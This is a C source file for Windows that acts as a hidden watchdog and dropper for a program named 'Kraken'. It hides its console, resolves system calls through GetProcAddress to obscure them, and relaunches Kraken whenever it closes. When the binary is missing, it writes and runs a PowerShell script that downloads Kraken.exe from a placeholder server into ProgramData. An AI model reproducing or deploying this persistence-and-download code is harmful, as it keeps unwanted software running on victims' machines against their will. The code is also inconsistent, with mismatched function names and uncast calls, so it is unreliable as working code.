#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include <shlwapi.h>
#include "shlobj.h"
#include <urlmon.h>

#define KrakenURL "[server_ip]/download/Kraken.exe"

DWORD PrintProcessNameAndID(DWORD processID);
int IsProcessRunning(DWORD pid);
DWORD FindKrakenProcess();
int FindKrakenFiles();
void TryDwnloadKraken();
void ShowErrors();

TCHAR szPath[MAX_PATH];
STARTUPINFO si;
PROCESS_INFORMATION pi;

//GetProcAddress(GetModuleHandle(TEXT("User32.dll")), "GetAsyncKeyState")(i);
//GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "CreateMutexA")

int main()
{
    GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "CreateMutexA")(NULL, TRUE, "8ae0048825a4f5d6faa917be98bd5b0c");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return -1;
    }
    else
    {
        DWORD PID = 0;
        int running = 0;
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, 0);
        running = IsKrakenRunning();
        while(!running)
        {
            printf("Did not fount process, trying open...\n");
            CallForKraken();
            running = IsKrakenRunning();
            if (running)
            {
                PID = FindKrakenProcess();
            }
            sleep(1);
        }
        printf("Found Kraken, PID: %u \n", PID);
        while(1)
        {
            running = IsProcessRunning(PID);
            sleep(1);
            if (running == 0)
            {
                //MessageBox(NULL,"Kraken zostal zamkniety, teraz to siê pogniewamy!","Error, error",MB_OK|MB_ICONERROR);
                CallForKraken();
                Sleep(1);
                PID = FindKrakenProcess();
            }
        }
        return 0;
    }
}


DWORD PrintProcessNameAndID( DWORD processID )
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "OpenProcess")( PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_READ,
                                   FALSE, processID );
    if (NULL != hProcess )
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),
                                 &cbNeeded) )
        {
            GetModuleBaseName( hProcess, hMod, szProcessName,
                               sizeof(szProcessName)/sizeof(TCHAR) );
        }
    }
    if (strncmp(szProcessName,"Kraken",6) != 0)
    {
        processID = -1;
    }
    GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "CloseHandle")(hProcess);
    return processID;
}

int IsProcessRunning(DWORD pid)
{
    HANDLE process = GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "OpenProcess")(SYNCHRONIZE, FALSE, pid);
    DWORD ret = GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "WaitForSingleObject")(process, 0);
    GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "CloseHandle")(process);
    return ret == WAIT_TIMEOUT;
}

DWORD FindKrakenProcess()
{
    DWORD lpid = 0;
    DWORD aProcesses[1024], cbNeeded, cProcesses, ret;
    unsigned int i;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    //For each process
    for ( i = 0; i < cProcesses; i++ )
    {
        if( aProcesses[i] != 0 )
        {
            //PID as parameter

            ret = PrintProcessNameAndID(aProcesses[i]);
            if (ret != -1)
            {
                lpid = ret;
            }
        }
    }
    return lpid;
}

int FindKrakenFiles()
{
    // Get path for each computer, non-user specific and non-roaming data.
    if ( SUCCEEDED( SHGetFolderPath( NULL, CSIDL_COMMON_APPDATA, NULL, 0, szPath ) ) )
    {
        PathAppend( szPath, _T("\\Kraken\\Kraken.exe") );
    }
    //printf("%s \n", szPath);
    DWORD dwAttrib = GetFileAttributes(szPath);
    if ((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib != FILE_ATTRIBUTE_DIRECTORY))
    {
        printf("I've found Kraken Files...\n");
        return 1;
    }
    else
    {
        return 0;
    }
}

void CallForKraken()
{
    if (FindKrakenFiles())
    {
        printf("Trying to run Kraken...\n");
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );
        //GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "CreateProcess")
        if( !GetProcAddress(GetModuleHandleA(TEXT("Kernel32.dll")), "CreateProcessA")( szPath,   // Full path to *.exe file.
                            NULL,        // Command line Argv[1]
                            NULL,           // Process handle not inheritable
                            NULL,           // Thread handle not inheritable
                            FALSE,          // Set handle inheritance to FALSE
                            CREATE_NEW_CONSOLE,// New console
                            NULL,           // Use parent's environment block
                            NULL,           // Use parent's starting directory
                            &si,            // Pointer to STARTUPINFO structure
                            &pi )           // Pointer to PROCESS_INFORMATION structure
          )
        {
            ShowErrors();
            printf("CreateProcess failed (%d).\n", GetLastError());
        }
    }
    else
    {
        printf("I don't see Kraken files, trying to download...\n");
        TryDownloadKraken();
        sleep(5);
    }
}

int IsKrakenRunning()
{
    DWORD PID = 0;
    PID = FindKrakenProcess();
    if (PID == 0)
    {
        return 0;
    }
    else
    {
        return 1;
    }
}

void ShowErrors()
{
    char buf[1024];
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "GetLastError"), 0,
                  buf, sizeof(buf), NULL);
    printf("ERROR: %s", buf);
}

void TryDownloadKraken()
{
    FILE* plik;
    if ((plik = fopen("dwnd.ps1","w")) != NULL)
    {
        if (fprintf(plik,"param($url, $filename);$client = new-object System.Net.WebClient;$client.DownloadFile( $url, $filename)") < 0)
        {
            printf("Can't write to file.");
            return -1;
        }
    }
    else
    {
        printf("Can't open file.");
        return -1;
    }
    fclose(plik);
    system("powershell -ExecutionPolicy RemoteSigned -File \"dwnd.ps1\" \"http://[server_IP]/download/Kraken.exe\" \"C:\\ProgramData\\Kraken\\Kraken.exe\"");
}
